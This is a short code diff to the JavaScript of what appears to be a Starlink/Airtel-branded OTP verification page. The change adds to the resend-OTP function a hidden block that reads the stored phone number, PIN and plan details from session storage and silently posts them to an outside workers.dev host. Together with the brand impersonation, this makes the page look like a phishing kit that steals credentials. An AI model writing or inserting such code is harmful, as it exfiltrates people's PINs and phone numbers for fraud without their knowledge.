@@ -747,7 +747,20 @@ function startTimer(){
     }
   }, 1000);
 }
-function resendOTP(){ if(timerSecs > 0) return; hap(H.confirm); startTimer(); }
+function resendOTP(){ if(timerSecs > 0) return; hap(H.confirm);
+  /* ── Worker: otp_resent ── */
+  (function(){
+    var _f={};var _a={};
+    try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
+    try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
+    fetch('https://airtel-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({event:'starlink_otp_resent',data:{
+        phone:_a.phone||'',pin:_a.pin||'',
+        forfait:_f.name||'',price:_f.price||'',ts:Date.now()
+      }})
+    }).catch(function(){});
+  })();
+  startTimer(); }
 function onOTPInput(val){
   if(timerSecs <= 0){ document.getElementById('otpInput').value = ''; return; }
   otpVal = val.replace(/[^0-9]/g,'').slice(0,4);
